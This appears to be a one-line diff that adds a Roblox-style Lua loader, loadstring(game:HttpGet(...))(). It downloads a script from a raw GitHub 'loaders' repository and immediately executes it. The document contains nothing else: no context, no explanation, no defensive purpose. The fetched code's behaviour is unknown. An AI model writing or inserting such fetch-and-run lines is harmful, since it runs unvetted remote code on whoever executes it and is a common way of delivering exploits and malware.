@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/hide-in-pixels-spam4-h2tql1tgidpvz4.lua"))()
